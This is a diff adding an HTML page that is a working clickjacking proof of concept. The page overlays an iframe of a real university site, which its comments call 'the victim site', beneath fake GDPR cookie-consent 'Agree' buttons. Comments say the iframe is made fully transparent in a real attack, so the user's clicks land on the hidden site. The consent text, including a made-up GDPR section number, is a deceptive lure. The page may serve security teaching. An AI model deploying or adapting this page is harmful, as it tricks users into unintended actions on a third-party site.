@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="UTF-8">
+  <title>title</title>
+  <link rel="stylesheet" href="https://unpkg.com/purecss@1.0.0/build/pure-min.css"
+    integrity="sha384-nn4HPE8lTHyVtfCBi5yW9d20FjT8BJwUXyWZT9InLYax14RDjBj46LmSztkmNP9w" crossorigin="anonymous">
+  <style scoped>
+    .button-xsmall {
+      font-size: 70%;
+    }
+
+    .button-small {
+      font-size: 85%;
+    }
+
+    .button-large {
+      font-size: 110%;
+    }
+
+    .button-xlarge {
+      font-size: 125%;
+    }
+
+    .button-success,
+    .button-error,
+    .button-warning,
+    .button-secondary {
+      color: white;
+      border-radius: 4px;
+      text-shadow: 0 1px 1px rgba(0, 0, 0, 0.2);
+    }
+
+    .button-success {
+      background: rgb(28, 184, 65);
+      /* this is a green */
+    }
+  </style>
+</head>
+
+<body>
+  <style>
+    iframe {
+      /* iframe from the victim site */
+      width: 200px;
+      height: 100px;
+      position: absolute;
+      top: 105px;
+      left: 15px;
+      opacity: 0.7;
+      /* in real opacity:0 */
+      z-index: 1;
+      border: none;
+    }
+
+    .cont {
+
+      position: absolute;
+      top: 100px;
+      left: 100px;
+
+    }
+  </style>
+  <iframe scrolling="no" src="https://ole.unibz.it/"></iframe>
+  <div class="cont">
+    <div>Due to GDPR regulations, please choose your preference:</div>
+
+    <!-- The url from the victim site -->
+
+
+    <button class="pure-button button-xsmall button-success">Agree</button> I agree to the use of cookies for the
+    purpose
+    of performance monitoring.
+
+    <br>
+
+    <div style="padding-top: 15px;"><button class="pure-button button-xsmall button-success">Agree</button> I agree to
+      the
+      temporary storage of my
+      visitor
+      logs in accordance to §151.a.15 of the GDPR.</div>
+
+    <div>If you do not agree, please close this tab immediatly.</div>
+  </div>
+</body>
+
+</html>
